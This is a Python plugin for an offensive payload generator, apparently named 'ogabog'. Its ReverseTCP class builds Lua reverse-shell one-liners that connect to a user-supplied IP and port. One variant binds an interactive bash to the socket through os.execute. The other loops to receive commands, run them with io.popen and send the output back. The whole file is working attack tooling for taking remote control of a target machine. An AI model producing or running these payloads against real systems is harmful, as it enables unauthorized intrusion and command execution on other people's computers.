from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--exec",
            default="os.execute",
            choices=[
                "os.execute",
                "io.popen"
            ]
        )
        self.opts.description = "[ReverseShell][TCP] Lua from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        # self.shell_type = 1
        self.is_interactive = True
        self.protocol = "tcp"

    def make_shell(self):
        if self.args.exec == "os.execute":
            self.shell = """lua -e "require('socket');require('os');t=socket.tcp();"""
            self.shell += f"""t:connect('{self.args.ip}','{self.args.port}');"""
            self.shell += f"""os.execute('{self.args.shell} -i <&3 >&3 2>&3'); \""""
        elif self.args.exec == "io.popen":
            self.shell = f"""lua -e 'local host, port = "{self.args.ip}", {self.args.port} local socket = require(
            "socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local 
            cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() 
            tcp:send(s) if status == "closed" then break end end tcp:close()' """
